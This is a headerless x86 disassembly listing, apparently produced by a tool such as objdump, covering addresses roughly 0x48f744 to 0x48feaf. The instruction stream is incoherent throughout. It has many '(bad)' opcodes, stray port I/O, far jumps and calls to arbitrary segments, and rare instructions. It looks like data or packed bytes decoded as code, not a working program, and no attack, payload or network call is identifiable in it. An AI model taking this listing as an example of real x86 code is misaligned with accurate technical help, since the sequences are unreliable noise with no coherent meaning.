  48f744:	frstor [eax+0xd]
  48f747:	and    al,0x42
  48f749:	pop    edi
  48f74a:	add    eax,0xb461c985
  48f74f:	mov    cl,0x49
  48f751:	lds    ecx,FWORD PTR [ecx]
  48f753:	inc    ecx
  48f754:	out    0x33,al
  48f756:	and    DWORD PTR [ecx],edx
  48f758:	or     DWORD PTR [edx-0x57],eax
  48f75b:	fst    QWORD PTR [ebx+0xc5db404]
  48f761:	in     al,0x99
  48f763:	xchg   esp,eax
  48f764:	cmp    DWORD PTR [ecx],ecx
  48f766:	(bad)  
  48f768:	xor    BYTE PTR [eax+0x4f9d823],ah
  48f76e:	mov    bl,0x88
  48f770:	sbb    al,0xc9
  48f772:	lods   al,BYTE PTR ds:[esi]
  48f773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f774:	imul   ebx,DWORD PTR [eax+eiz*2-0x59c60819],0xc0da06da
  48f77f:	sbb    ah,bl
  48f781:	pop    es
  48f782:	fsubr  QWORD PTR [ecx-0x20]
  48f785:	xor    eax,0xc5e41cd4
  48f78a:	js     0x48f7c4
  48f78c:	add    ah,BYTE PTR [ebp-0x47a204d1]
  48f792:	dec    esp
  48f793:	dec    ebx
  48f794:	pop    ebp
  48f795:	add    eax,0x2c289923
  48f79a:	xchg   BYTE PTR [ebx-0xedf6225],cl
  48f7a0:	mov    bl,0x48
  48f7a2:	pop    ecx
  48f7a3:	lahf   
  48f7a4:	or     eax,0x877c462a
  48f7a9:	in     al,0x6a
  48f7ab:	arpl   WORD PTR ds:0x86f6c699,sp
  48f7b1:	mov    cl,0x81
  48f7b3:	inc    ebx
  48f7b4:	or     BYTE PTR [ebx+0x65aa06be],bh
  48f7ba:	xor    eax,0xec4e75a6
  48f7bf:	sbb    eax,DWORD PTR [esi-0x35]
  48f7c2:	adc    ch,bh
  48f7c4:	test   DWORD PTR [edx+eiz*1+0x7207be16],edi
  48f7cb:	clc    
  48f7cc:	mov    edx,0x5728eb08
  48f7d1:	(bad)  
  48f7d3:	jo     0x48f813
  48f7d5:	es mov eax,0x13eb3429
  48f7db:	add    BYTE PTR [eax],ch
  48f7dd:	lock sbb al,0x66
  48f7e0:	loopne 0x48f802
  48f7e2:	cli    
  48f7e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f7e4:	sbb    eax,0x18d0c550
  48f7e9:	test   al,0x91
  48f7eb:	jg     0x48f7a1
  48f7ed:	adc    cl,dl
  48f7ef:	rcl    BYTE PTR ds:0xb05571f0,1
  48f7f5:	es push ds
  48f7f7:	push   ebp
  48f7f8:	jp     0x48f824
  48f7fa:	out    dx,eax
  48f7fb:	dec    esp
  48f7fc:	push   0x91788a02
  48f801:	enter  0x7446,0x8d
  48f805:	dec    edx
  48f806:	test   BYTE PTR [esi+0x40],dl
  48f809:	dec    ebx
  48f80a:	xchg   BYTE PTR [edx+eiz*2],dl
  48f80d:	sbb    DWORD PTR fs:[eax],edx
  48f810:	push   es
  48f811:	imul   ebx,edx,0x8903109f
  48f817:	pop    ecx
  48f818:	add    al,0x2a
  48f81a:	and    BYTE PTR [eax+ecx*1],cl
  48f81d:	int    0x36
  48f81f:	in     eax,dx
  48f820:	inc    ecx
  48f821:	inc    edx
  48f822:	and    BYTE PTR [eax+0x6],dl
  48f825:	and    al,0x4a
  48f827:	sbb    al,0xc
  48f829:	ins    BYTE PTR es:[edi],dx
  48f82a:	shl    BYTE PTR [edi],1
  48f82c:	pop    ebp
  48f82d:	bound  ebx,QWORD PTR [edx+0x59]
  48f830:	xchg   esi,eax
  48f831:	adc    ebx,DWORD PTR [edx+0x18]
  48f834:	lahf   
  48f835:	sub    bl,BYTE PTR ds:0x303750f
  48f83b:	shr    DWORD PTR [ebx],0x66
  48f83e:	and    ch,dh
  48f840:	or     eax,0xd82119d
  48f845:	(bad)  
  48f846:	inc    DWORD PTR [eax+0x2b047dfc]
  48f84c:	icebp  
  48f84d:	mov    DWORD PTR [ebx],esi
  48f84f:	mov    edi,0x319b15c4
  48f854:	fcom   QWORD PTR [ebx-0x2]
  48f857:	cmp    BYTE PTR [edx+0x4925e4e2],0x3c
  48f85e:	dec    ebx
  48f85f:	mov    BYTE PTR [eax+0x43],dh
  48f862:	or     BYTE PTR ds:0x79980620,ah
  48f868:	mov    WORD PTR [ecx+0x7d],es
  48f86b:	add    bh,BYTE PTR [edx]
  48f86d:	add    al,0xa0
  48f86f:	in     al,dx
  48f870:	je     0x48f83a
  48f872:	push   ebp
  48f873:	jge    0x48f7fe
  48f875:	pop    eax
  48f876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f877:	and    esp,ebx
  48f879:	in     al,dx
  48f87a:	inc    esi
  48f87b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f87c:	mov    ecx,0x3d4c9fda
  48f881:	mov    ch,0xc8
  48f883:	pop    ecx
  48f884:	aas    
  48f885:	loopne 0x48f893
  48f887:	jae    0x48f852
  48f889:	inc    eax
  48f88a:	xchg   edx,eax
  48f88b:	lock inc edx
  48f88d:	gs and dh,dl
  48f890:	or     eax,0x4c25f4ec
  48f895:	dec    ebx
  48f896:	clc    
  48f897:	jo     0x48f8e1
  48f899:	call   0x4b9251c0
  48f89e:	add    DWORD PTR [esi+0x56],ebx
  48f8a1:	sub    dl,bh
  48f8a3:	mov    esi,0x6b3ebe6a
  48f8a8:	enter  0xb1b3,0x20
  48f8ac:	dec    edi
  48f8ad:	inc    ebx
  48f8ae:	sub    cl,cl
  48f8b0:	les    eax,FWORD PTR [edi-0x4f]
  48f8b3:	mov    cl,0xe3
  48f8b5:	mov    dl,0x56
  48f8b7:	add    bh,0x2b
  48f8ba:	test   esp,edx
  48f8bc:	or     edx,edx
  48f8be:	jl     0x48f93c
  48f8c0:	jp     0x48f904
  48f8c2:	or     DWORD PTR [eax+edx*4+0x10a44494],edx
  48f8c9:	jno    0x48f924
  48f8cb:	adc    eax,0xfc72b697
  48f8d0:	or     edi,DWORD PTR [di+0x5c]
  48f8d4:	xchg   esi,eax
  48f8d5:	jmp    0x48f953
  48f8d7:	pop    ebx
  48f8d8:	sub    al,BYTE PTR [ebp+0xf]
  48f8db:	popf   
  48f8dc:	rcl    DWORD PTR [edx-0x8],0xb2
  48f8e0:	add    esp,DWORD PTR [ecx+0x56235c2]
  48f8e6:	xchg   esp,eax
  48f8e7:	outs   dx,BYTE PTR ds:[esi]
  48f8e8:	int    0x1
  48f8ea:	xlat   BYTE PTR ds:[ebx]
  48f8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f8ec:	mov    DWORD PTR [ecx+0x0],ebp
  48f8ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f8f0:	push   esi
  48f8f1:	cli    
  48f8f2:	daa    
  48f8f3:	mov    dh,0x90
  48f8f5:	dec    ecx
  48f8f6:	add    al,0x3e
  48f8f8:	or     ch,BYTE PTR [eax]
  48f8fa:	je     0x48f89d
  48f8fc:	add    eax,0x9c92ab42
  48f901:	xchg   edx,eax
  48f902:	imul   ebx,DWORD PTR [ecx+0x32],0x58e12cf0
  48f909:	mov    edi,0xc4a19f9
  48f90e:	pop    DWORD PTR [ebp-0x2]
  48f911:	int3   
  48f912:	cmp    BYTE PTR [eax+0x2d7d311b],ah
  48f918:	out    0xc8,eax
  48f91a:	fwait
  48f91b:	and    eax,0xf802b240
  48f920:	mov    eax,ds:0x88747384
  48f925:	inc    edx
  48f926:	xor    bh,al
  48f928:	jg     0x48f929
  48f92a:	mov    al,0xc9
  48f92c:	dec    ebx
  48f92d:	or     eax,0x12042d33
  48f932:	loope  0x48f900
  48f934:	sub    BYTE PTR [ebx-0x58],0x89
  48f938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f939:	mov    cl,0x40
  48f93b:	push   eax
  48f93c:	cmp    dh,BYTE PTR [eax]
  48f93e:	or     edi,DWORD PTR [edi]
  48f940:	pushf  
  48f941:	add    ecx,DWORD PTR [edx-0xe06dbcc]
  48f947:	dec    esp
  48f948:	enter  0xaeb0,0x7
  48f94c:	pop    edi
  48f94d:	test   al,0x8
  48f94f:	dec    ebp
  48f950:	xchg   ebp,eax
  48f951:	xor    BYTE PTR [ebp+0x0],cl
  48f954:	(bad)  es:[ecx-0x33f9e8e0]
  48f95b:	mov    DWORD PTR [eax],0xa6c1e056
  48f961:	xor    DWORD PTR [edi+0x5938751f],0xfffffffe
  48f968:	fwait
  48f969:	jp     0x48f8fb
  48f96b:	aas    
  48f96c:	cmp    al,0x2b
  48f96e:	pop    eax
  48f96f:	dec    eax
  48f970:	sar    ebx,1
  48f972:	lods   al,BYTE PTR ds:[esi]
  48f973:	sub    DWORD PTR ds:0xd3a806,0xc536a837
  48f97d:	rol    BYTE PTR [ebp-0x14ca23bb],0x30
  48f984:	popa   
  48f985:	mov    eax,ds:0x246fa10d
  48f98a:	imul   esi,DWORD PTR [ecx],0xb1cea242
  48f990:	sbb    BYTE PTR [ebx+0x3],ah
  48f993:	pop    ss
  48f994:	mov    dl,0x9e
  48f996:	loop   0x48f9ed
  48f998:	bound  ecx,QWORD PTR [edx]
  48f99a:	sar    BYTE PTR [ebx-0x4195c52f],0x52
  48f9a1:	or     eax,0x7803c84c
  48f9a6:	ins    BYTE PTR es:[edi],dx
  48f9a7:	jmp    0x4a97:0x7114f176
  48f9ae:	jns    0x48f9c8
  48f9b0:	cvtps2pi mm6,QWORD PTR [ebp-0x23dd8982]
  48f9b7:	les    edi,FWORD PTR [edx-0x3d51ae34]
  48f9bd:	cli    
  48f9be:	adc    eax,esi
  48f9c0:	mov    al,BYTE PTR [esi]
  48f9c2:	or     al,0x83
  48f9c4:	into   
  48f9c5:	or     ebx,DWORD PTR [ecx+0x700e08fa]
  48f9cb:	inc    esp
  48f9cc:	jmp    0x48f9d5
  48f9ce:	jne    0x48f9eb
  48f9d0:	sub    eax,0x59e93075
  48f9d5:	out    0x6,eax
  48f9d7:	jmp    0x825881e0
  48f9dc:	aaa    
  48f9dd:	sub    BYTE PTR [ebx+0x367485e],cl
  48f9e3:	pop    esi
  48f9e4:	inc    eax
  48f9e5:	xor    al,0xb0
  48f9e7:	xor    BYTE PTR [edi],0xb2
  48f9ea:	pop    edi
  48f9eb:	jb     0x48f9ed
  48f9ed:	or     bl,BYTE PTR [esi]
  48f9ef:	ret    0xb2c9
  48f9f2:	add    BYTE PTR [eax],ch
  48f9f4:	nop
  48f9f5:	mov    dl,BYTE PTR [edi]
  48f9f7:	cmp    al,0x5
  48f9f9:	inc    esi
  48f9fa:	popf   
  48f9fb:	mov    BYTE PTR [eax+ecx*4+0x60],ah
  48f9ff:	push   esp
  48fa00:	jge    0x48fa4a
  48fa02:	es pop ss
  48fa04:	(bad)  
  48fa05:	loop   0x48f9cd
  48fa07:	adc    dh,BYTE PTR [ebp-0x188ff64b]
  48fa0d:	and    al,0xdb
  48fa0f:	ss push 0x1b
  48fa12:	xchg   edx,eax
  48fa13:	jne    0x48fa17
  48fa15:	cdq    
  48fa16:	sub    eax,0x3c036a23
  48fa1b:	mov    ds:0xeb8d20f5,al
  48fa20:	push   ecx
  48fa21:	mov    ds:0xe760d62b,eax
  48fa26:	inc    ebx
  48fa27:	ins    DWORD PTR es:[edi],dx
  48fa28:	add    al,0x6d
  48fa2a:	inc    ebx
  48fa2b:	add    dl,BYTE PTR [ebp+0x2f914ae0]
  48fa31:	and    ch,ch
  48fa33:	dec    eax
  48fa34:	push   ds
  48fa35:	sbb    ebp,DWORD PTR [ebp+eax*1+0x133c01d3]
  48fa3c:	dec    edi
  48fa3d:	push   esi
  48fa3e:	push   ebx
  48fa3f:	jbe    0x48faa2
  48fa41:	and    DWORD PTR [ebx],esp
  48fa43:	pop    ss
  48fa44:	jge    0x48fa45
  48fa46:	or     esi,DWORD PTR [ebp-0x4319f4f1]
  48fa4c:	(bad)
  48fa4f:	and    BYTE PTR [edi],al
  48fa51:	mov    dl,0xd5
  48fa53:	aaa    
  48fa54:	call   0x6700aa24
  48fa59:	add    BYTE PTR [esi],dl
  48fa5b:	sti    
  48fa5c:	ins    BYTE PTR es:[edi],dx
  48fa5d:	hlt    
  48fa5e:	mov    fs,WORD PTR [edx-0x2b]
  48fa61:	ror    BYTE PTR [edx],1
  48fa63:	jns    0x48fa2a
  48fa65:	or     eax,0xce085627
  48fa6a:	loope  0x48faa5
  48fa6c:	mov    ah,0x1f
  48fa6e:	loope  0x48fae4
  48fa70:	pop    ds
  48fa71:	xchg   esp,eax
  48fa72:	xor    eax,0x9768d236
  48fa77:	push   esp
  48fa78:	add    edx,DWORD PTR [esi+0x6b20f423]
  48fa7e:	jmp    0x48faef
  48fa80:	pop    ss
  48fa81:	test   esi,edx
  48fa83:	call   0x9949:0x2188f1a9
  48fa8a:	fld    DWORD PTR [ecx+eiz*1-0x14]
  48fa8e:	mov    db4,edx
  48fa91:	xor    BYTE PTR gs:[ecx+0x255683bb],0xb1
  48fa99:	push   ebx
  48fa9a:	or     esi,DWORD PTR [eax]
  48fa9c:	jmp    0x48faae
  48fa9e:	das    
  48fa9f:	dec    ecx
  48faa0:	push   cs
  48faa1:	xchg   ebx,eax
  48faa2:	je     0x48fa8c
  48faa4:	icebp  
  48faa5:	call   0xb58cbb76
  48faaa:	test   al,0xfb
  48faac:	jmp    0x88dc7b6
  48fab1:	or     esi,DWORD PTR [ecx-0x36]
  48fab4:	aaa    
  48fab5:	cld    
  48fab6:	loope  0x48fa4c
  48fab8:	cmp    BYTE PTR [eax],ch
  48faba:	stc    
  48fabb:	or     edi,ecx
  48fabd:	xchg   DWORD PTR [eax+0xf],ecx
  48fac0:	jmp    0xf897:0x2fbe3a40
  48fac7:	ret    
  48fac8:	inc    esp
  48fac9:	mov    WORD PTR ds:0x7883ad39,es
  48facf:	inc    esp
  48fad0:	sub    ah,BYTE PTR [edx-0x3b]
  48fad3:	mov    ecx,DWORD PTR [edi+edx*4]
  48fad6:	xchg   edi,eax
  48fad7:	mov    bh,0xd6
  48fad9:	mov    al,ds:0x36cb1de2
  48fade:	xchg   ebp,eax
  48fadf:	inc    ebp
  48fae0:	loopne 0x48fb2d
  48fae2:	lods   al,BYTE PTR ds:[esi]
  48fae3:	ja     0x48fa9b
  48fae5:	cmp    BYTE PTR [esi+0x14],0xdb
  48fae9:	push   edx
  48faea:	mov    edx,0x686a58a6
  48faef:	push   es
  48faf0:	push   ds
  48faf1:	adc    DWORD PTR [edi],ebp
  48faf3:	pop    esi
  48faf4:	pop    esp
  48faf5:	jmp    0x48fb3c
  48faf7:	jb     0x48fb07
  48faf9:	lods   al,BYTE PTR ds:[esi]
  48fafa:	retf   
  48fafb:	sub    DWORD PTR [ebx],ebp
  48fafd:	jmp    0x520b:0xe58239cd
  48fb04:	push   ebp
  48fb05:	cld    
  48fb06:	xlat   BYTE PTR ds:[ebx]
  48fb07:	icebp  
  48fb08:	arpl   WORD PTR [ebp+0x2],dx
  48fb0b:	(bad)  
  48fb0c:	lods   eax,DWORD PTR ds:[esi]
  48fb0d:	dec    eax
  48fb0e:	pusha  
  48fb0f:	stos   BYTE PTR es:[edi],al
  48fb10:	dec    esp
  48fb11:	pop    edi
  48fb12:	rcl    DWORD PTR [ebx-0x2c],cl
  48fb15:	dec    eax
  48fb16:	push   ds
  48fb17:	mov    gs,WORD PTR [ebx+0x3d4ae04e]
  48fb1d:	sub    edi,ebp
  48fb1f:	push   ecx
  48fb20:	mov    ds:0xd4915e9c,eax
  48fb25:	enter  0x4c83,0x89
  48fb29:	add    eax,DWORD PTR [ebx-0x411af902]
  48fb2f:	mov    ebp,0x25e0726d
  48fb34:	mov    ebx,0x5c152152
  48fb39:	ja     0x48fb28
  48fb3b:	add    al,0xa5
  48fb3d:	mov    ah,0xd2
  48fb3f:	cwde   
  48fb40:	jmp    0x48fb4c
  48fb42:	or     bl,BYTE PTR [edi-0x59f526df]
  48fb48:	pop    ss
  48fb49:	aam    0xa8
  48fb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48fb4c:	test   ebp,esp
  48fb4e:	sub    BYTE PTR [eax+0xf853d63],dh
  48fb54:	rcl    DWORD PTR [eax],1
  48fb56:	int    0xc
  48fb58:	cmp    esi,ebp
  48fb5a:	lock jmp 0x48fb84
  48fb5d:	jge    0x48fb83
  48fb5f:	and    eax,0xeb71f7a0
  48fb64:	sbb    BYTE PTR [ecx],ch
  48fb66:	jl     0x48fbc1
  48fb68:	rcr    BYTE PTR [esi+edx*1],0x1
  48fb6c:	or     ecx,ebp
  48fb6e:	xchg   ecx,eax
  48fb6f:	popf   
  48fb70:	xchg   DWORD PTR [ebx+0x5a5cc0a4],ebx
  48fb76:	lea    edx,cs:[esi]
  48fb79:	(bad)  
  48fb7a:	mov    bh,0x41
  48fb7c:	fild   WORD PTR [ebx]
  48fb7e:	add    eax,0x2e40759c
  48fb83:	xlat   BYTE PTR ds:[ebx]
  48fb84:	push   edi
  48fb85:	jo     0x48fb5d
  48fb87:	in     al,0x1c
  48fb89:	adc    BYTE PTR [ebx+0x22],ah
  48fb8c:	or     cl,ch
  48fb8e:	inc    ebp
  48fb8f:	sbb    ch,BYTE PTR [edx]
  48fb91:	push   ebp
  48fb92:	add    BYTE PTR [esi+edi*2-0x6b],cl
  48fb96:	mov    ebx,0x9c22029a
  48fb9b:	add    esi,DWORD PTR cs:[eax]
  48fb9e:	mov    ebp,0x37a598e7
  48fba3:	mov    eax,ss
  48fba5:	ret    0xf9ef
  48fba8:	cwde   
  48fba9:	jb     0x48fbbd
  48fbab:	inc    eax
  48fbac:	nop
  48fbad:	iret   
  48fbae:	mov    ds:0xd70a0860,eax
  48fbb3:	scas   eax,DWORD PTR es:[edi]
  48fbb4:	adc    ecx,edi
  48fbb6:	add    DWORD PTR [ebx],esp
  48fbb8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48fbba:	imul   ebx,ebx,0x2
  48fbbd:	add    BYTE PTR [ecx+0x32],0x84
  48fbc1:	scas   al,BYTE PTR es:[edi]
  48fbc2:	call   0x47431757
  48fbc7:	por    mm2,QWORD PTR ds:0x5deb976b
  48fbce:	push   ss
  48fbcf:	push   es
  48fbd0:	(bad)  
  48fbd1:	mov    ebp,0x42807d98
  48fbd6:	sbb    cl,BYTE PTR [ebx]
  48fbd8:	inc    edi
  48fbd9:	sti    
  48fbda:	repnz and ch,BYTE PTR [eax*8-0x20b8b969]
  48fbe2:	sub    BYTE PTR [ebp+0x30],0x7f
  48fbe6:	aas    
  48fbe7:	sbb    cl,ch
  48fbe9:	repnz push ecx
  48fbeb:	or     al,0x40
  48fbed:	lahf   
  48fbee:	push   edx
  48fbef:	rol    BYTE PTR [eax+eax*1-0x78],1
  48fbf3:	xor    ch,BYTE PTR [edx]
  48fbf5:	and    eax,0x4cdc0c76
  48fbfa:	sub    al,0xb0
  48fbfc:	(bad)  
  48fbfd:	push   eax
  48fbfe:	nop
  48fbff:	sbb    DWORD PTR [eax],ecx
  48fc01:	rcr    BYTE PTR [ebx-0x3bc37e8f],0x6
  48fc08:	out    dx,eax
  48fc09:	pop    ecx
  48fc0a:	rol    BYTE PTR [esp+eax*2-0x57],1
  48fc0e:	(bad)  
  48fc0f:	outs   dx,BYTE PTR ds:[esi]
  48fc10:	in     al,dx
  48fc11:	jmp    DWORD PTR [ecx]
  48fc13:	mov    al,0x23
  48fc15:	loope  0x48fc89
  48fc17:	pop    ss
  48fc18:	xor    BYTE PTR [edi-0x5fb91f20],0x82
  48fc1f:	mov    esp,0xd5d344a7
  48fc24:	rcr    ah,0x41
  48fc27:	add    DWORD PTR [ebp+0x24],esi
  48fc2a:	rcl    BYTE PTR [ecx+0x743fbc02],0x18
  48fc31:	or     DWORD PTR [edx+0x1c],esp
  48fc34:	repnz adc DWORD PTR ds:0xa1e06e53,0x74
  48fc3c:	jno    0x48fc1e
  48fc3e:	daa    
  48fc3f:	and    al,BYTE PTR [eax+0x1174dd91]
  48fc45:	or     al,0x52
  48fc47:	mov    ebp,0x1d1fb15f
  48fc4c:	or     eax,0xe307c25
  48fc51:	xor    eax,0xf858e5ef
  48fc56:	daa    
  48fc57:	shl    DWORD PTR [edx+0x52],cl
  48fc5a:	js     0x48fbf3
  48fc5c:	mov    bh,bl
  48fc5e:	mov    ebp,0x6021f819
  48fc63:	in     al,0x9
  48fc65:	inc    ebp
  48fc66:	sbb    DWORD PTR [eax+0x29],ebx
  48fc69:	popf   
  48fc6a:	adc    ecx,DWORD PTR [eax+0x78]
  48fc6d:	daa    
  48fc6e:	xor    eax,0x1f90331b
  48fc73:	div    DWORD PTR [ebx]
  48fc75:	inc    ax
  48fc77:	mov    WORD PTR [ebp+0x69],es
  48fc7a:	call   0xb6fd1b63
  48fc7f:	(bad)  
  48fc80:	and    ebp,edx
  48fc82:	je     0x48fce9
  48fc84:	push   0xffffffe9
  48fc86:	xchg   BYTE PTR [ecx-0x100ba6ec],bl
  48fc8c:	add    eax,0x146bb20
  48fc91:	stc    
  48fc92:	enter  0x642b,0xd2
  48fc96:	call   0xb000:0x9d87e164
  48fc9d:	adc    esi,DWORD PTR [edi+0x8]
  48fca0:	ret    0x5791
  48fca3:	(bad)  
  48fca4:	repz pusha 
  48fca6:	adc    eax,DWORD PTR [eax+0x3e865243]
  48fcac:	daa    
  48fcad:	inc    esi
  48fcae:	shl    BYTE PTR [ecx-0x7f382b06],0x79
  48fcb5:	jmp    0x48fccb
  48fcb7:	retf   
  48fcb8:	xchg   edi,edx
  48fcba:	ins    DWORD PTR es:[edi],dx
  48fcbb:	xchg   ebp,eax
  48fcbc:	dec    esp
  48fcbd:	or     ch,dl
  48fcbf:	mov    ecx,DWORD PTR [ebx-0x6d4fb5bb]
  48fcc5:	scas   eax,DWORD PTR es:[edi]
  48fcc6:	inc    ecx
  48fcc7:	nop
  48fcc8:	clc    
  48fcc9:	fld    DWORD PTR [ecx]
  48fccb:	push   eax
  48fccc:	test   BYTE PTR [ecx+ebp*1-0x551f274d],dl
  48fcd3:	or     bl,ah
  48fcd5:	mov    bh,0x6b
  48fcd7:	imul   eax,DWORD PTR [esi+0x33],0xffffffa1
  48fcdb:	fistp  DWORD PTR [edi+eiz*4-0x40]
  48fcdf:	icebp  
  48fce0:	sub    DWORD PTR [ecx-0x23df3f0],0x5e
  48fce7:	imul   edi,DWORD PTR [eax],0x4410d28b
  48fced:	xor    eax,DWORD PTR [edx+0x3e53da42]
  48fcf3:	sbb    esp,DWORD PTR [edi]
  48fcf5:	xchg   edx,eax
  48fcf6:	cmp    bl,bh
  48fcf8:	ja     0x48fd5e
  48fcfa:	int3   
  48fcfb:	popa   
  48fcfc:	pop    eax
  48fcfd:	jl     0x48fd6a
  48fcff:	test   DWORD PTR ds:0xd522421b,ebx
  48fd05:	cmp    BYTE PTR [ebx],al
  48fd07:	test   BYTE PTR ds:0x70893d46,dl
  48fd0d:	js     0x48fd4f
  48fd0f:	pop    es
  48fd10:	and    eax,0x220e49a1
  48fd15:	lock js 0x48fd66
  48fd18:	xchg   ebx,eax
  48fd19:	ret    0x89a7
  48fd1c:	push   ds
  48fd1d:	in     al,0x3
  48fd1f:	sub    eax,DWORD PTR [ecx]
  48fd21:	push   edi
  48fd22:	out    dx,eax
  48fd23:	lock push 0x8e580782
  48fd29:	inc    edi
  48fd2a:	neg    DWORD PTR [edx+0xe4774c2]
  48fd30:	sbb    al,0xc7
  48fd32:	cmp    DWORD PTR [esi],ebp
  48fd34:	pop    ds
  48fd35:	test   BYTE PTR [ebx-0x793db6f6],cl
  48fd3b:	dec    ebx
  48fd3c:	cmp    al,0x7a
  48fd3e:	loopne 0x48fce5
  48fd40:	xor    al,0xd0
  48fd42:	dec    eax
  48fd43:	dec    esp
  48fd44:	fisttp WORD PTR [eax+eiz*8]
  48fd47:	int    0x58
  48fd49:	mov    esi,DWORD PTR [edx+edx*2+0x0]
  48fd4d:	or     DWORD PTR [ecx],edi
  48fd4f:	cmp    bl,al
  48fd51:	inc    ebx
  48fd52:	dec    edx
  48fd53:	ins    BYTE PTR es:[edi],dx
  48fd54:	ret    
  48fd55:	add    al,0x94
  48fd57:	dec    BYTE PTR [ebp+0x15f23000]
  48fd5d:	pop    es
  48fd5e:	js     0x48fcf1
  48fd60:	loopne 0x48fdb5
  48fd62:	mov    bl,BYTE PTR [edx]
  48fd64:	outs   dx,DWORD PTR ds:[esi]
  48fd65:	add    al,0xc3
  48fd67:	push   eax
  48fd68:	pop    ecx
  48fd69:	pop    ebp
  48fd6a:	call   0xdc6f:0xc06c1c40
  48fd71:	(bad)  [eax+0x6a]
  48fd74:	popw   es
  48fd76:	push   esp
  48fd77:	pop    es
  48fd78:	dec    ebx
  48fd79:	cdq    
  48fd7a:	pop    eax
  48fd7b:	dec    esp
  48fd7c:	test   BYTE PTR [ebp+0x60c32c6d],cl
  48fd82:	mov    ds:0x24313434,al
  48fd87:	inc    esp
  48fd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48fd89:	cmc    
  48fd8a:	dec    ecx
  48fd8b:	mov    ecx,0xebecd7c0
  48fd90:	mov    ss,WORD PTR [ebx]
  48fd92:	adc    eax,DWORD PTR ds:0xe1c0406d
  48fd98:	push   ebp
  48fd99:	(bad)  [esi+ecx*4+0x75af2044]
  48fda0:	sub    BYTE PTR [edx-0x2fe10f90],bh
  48fda6:	cmp    ebx,ebx
  48fda8:	les    ebx,FWORD PTR [edx+ebx*1]
  48fdab:	dec    ecx
  48fdac:	in     eax,dx
  48fdad:	leave  
  48fdae:	lock ins BYTE PTR es:[edi],dx
  48fdb0:	pop    ds
  48fdb1:	inc    edi
  48fdb2:	lods   al,BYTE PTR ds:[esi]
  48fdb3:	dec    edx
  48fdb4:	pushf  
  48fdb5:	pop    edx
  48fdb6:	add    DWORD PTR [eax+0x51b1752f],edx
  48fdbc:	rcl    BYTE PTR [ebx+ecx*4],0xcf
  48fdc0:	sbb    dl,dh
  48fdc2:	or     BYTE PTR [ebx],al
  48fdc4:	push   edi
  48fdc5:	lods   eax,DWORD PTR ds:[esi]
  48fdc6:	or     BYTE PTR [eax],bh
  48fdc8:	repz and ebp,eax
  48fdcb:	mov    ds:0x32a01f16,al
  48fdd0:	and    BYTE PTR [ebx-0x1faca271],0x18
  48fdd7:	scas   al,BYTE PTR es:[edi]
  48fdd8:	in     al,0x4e
  48fdda:	adc    BYTE PTR [ebx-0x3c],dl
  48fddd:	or     eax,0x3610060d
  48fde2:	mov    ds:0x70db1495,eax
  48fde7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  48fde9:	inc    ecx
  48fdea:	cwde   
  48fdeb:	rcl    DWORD PTR [eax-0x33e1e48],cl
  48fdf1:	loop   0x48fda8
  48fdf3:	xor    ebp,DWORD PTR [ecx-0x3c8df170]
  48fdf9:	or     dh,BYTE PTR [edi+0x55353eab]
  48fdff:	mov    ch,0xf6
  48fe01:	fadd   DWORD PTR [ebp+0x551ab7c1]
  48fe07:	rcr    edi,1
  48fe09:	mov    al,0xa6
  48fe0b:	or     DWORD PTR [edx-0x57],edx
  48fe0e:	or     bl,BYTE PTR [edi+0x70ab055c]
  48fe14:	ins    DWORD PTR es:[edi],dx
  48fe15:	dec    edi
  48fe16:	push   eax
  48fe18:	or     al,0x25
  48fe1a:	push   ebx
  48fe1b:	test   ch,al
  48fe1d:	(bad)
  48fe20:	dec    esp
  48fe21:	xchg   ecx,eax
  48fe22:	(bad)
  48fe25:	sub    BYTE PTR [eax-0x6f903af4],dl
  48fe2b:	dec    esi
  48fe2c:	push   ss
  48fe2d:	jo     0x48fe1f
  48fe2f:	add    dl,BYTE PTR [ecx+0x38]
  48fe32:	jb     0x48fe4d
  48fe34:	fnsetpm(287 only) 
  48fe36:	sub    eax,0x521d4b3b
  48fe3b:	cli    
  48fe3c:	sub    BYTE PTR [ebp-0x34ac4bc6],0x1d
  48fe43:	shr    BYTE PTR [eax-0x227229af],1
  48fe49:	test   BYTE PTR [edx],dl
  48fe4b:	out    0xb7,eax
  48fe4d:	sub    bl,BYTE PTR [edi]
  48fe4f:	test   al,0xb7
  48fe51:	(bad)  
  48fe52:	mov    edx,0x5092e515
  48fe58:	push   es
  48fe59:	adc    bl,BYTE PTR [edx+0x3b05699]
  48fe5f:	mov    dh,0x4a
  48fe61:	mov    eax,ds:0x568e98c0
  48fe66:	dec    ebx
  48fe67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48fe68:	xor    al,0xab
  48fe6a:	dec    eax
  48fe6b:	dec    ecx
  48fe6c:	cmp    eax,0x881f5840
  48fe71:	push   0x6183c5c8
  48fe76:	push   ds
  48fe77:	out    dx,eax
  48fe78:	mov    esi,ss
  48fe7a:	inc    ecx
  48fe7b:	or     ebx,DWORD PTR [ecx]
  48fe7d:	(bad)  
  48fe7e:	mov    ch,0xd3
  48fe80:	xor    al,0x56
  48fe82:	add    BYTE PTR [eax+0x7],ch
  48fe85:	pop    edi
  48fe86:	or     eax,0x3717d9ad
  48fe8b:	adc    DWORD PTR [edi+0x56],edx
  48fe8e:	mov    cl,0x69
  48fe90:	pop    esp
  48fe91:	inc    ebx
  48fe92:	sub    ebp,edi
  48fe94:	pminub mm3,QWORD PTR [eax+0x5320c486]
  48fe9b:	xchg   esp,eax
  48fe9c:	xchg   esp,eax
  48fe9d:	sub    al,0x52
  48fe9f:	sbb    ch,BYTE PTR [esi]
  48fea1:	pop    edx
  48fea2:	jecxz  0x48feb0
  48fea4:	loopne 0x48ff09
  48fea6:	xchg   edi,eax
  48fea7:	mov    al,0xe7
  48fea9:	xchg   ecx,eax
  48feaa:	and    al,BYTE PTR [esi+0x14]
  48fead:	jo     0x48fe39
  48feaf:	dec    esp
